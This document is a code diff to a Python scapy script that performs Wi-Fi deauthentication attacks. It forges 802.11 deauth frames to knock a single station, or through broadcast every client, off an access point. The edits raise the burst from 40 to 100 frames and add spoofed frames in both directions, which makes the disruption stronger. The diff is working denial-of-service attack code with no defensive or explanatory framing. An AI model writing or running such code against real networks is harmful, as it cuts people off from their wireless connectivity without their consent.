@@ -1,6 +1,6 @@
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Auth, RadioTap
-import argparse, sys
+import argparse
 
 broadcast = "ff:ff:ff:ff:ff:ff"
 
@@ -12,18 +12,23 @@ def deauthAttack(interface, ap, station=None):
         # AP broadcast
         target = broadcast
         gateway = ap
+        dot11 = Dot11(subtype=12, addr1=target, addr2=gateway, addr3=gateway)
+        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
+        sendp(pkt, inter=0.1, count=100, iface=interface, verbose=1)
     else:
         # AP unicast
         target = station
         gateway = ap
+        dot11 = Dot11(subtype=12, addr1=target, addr2=gateway, addr3=gateway)
+        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
+        sendp(pkt, inter=0.1, count=100, iface=interface, verbose=1)
 
-    # Station unicast
-    #target = ap
-    #gateway = station
-
-    dot11 = Dot11(subtype=12, addr1=target, addr2=gateway, addr3=gateway)
-    pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
-    sendp(pkt, inter=0.1, count=40, iface=interface, verbose=1)
+        # Station unicast
+        target = ap
+        gateway = station
+        dot11 = Dot11(subtype=12, addr1=target, addr2=gateway, addr3=gateway)
+        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)
+        sendp(pkt, inter=0.1, count=100, iface=interface, verbose=1)
 
 
 if __name__ == "__main__":
@@ -35,7 +40,7 @@ if __name__ == "__main__":
     args = parser.parse_args()
 
     if args.auth:
-        print("auth")
+        print("It'll be applied asap.")
     else:
         deauthAttack(args.interface, args.ap, args.c)
 
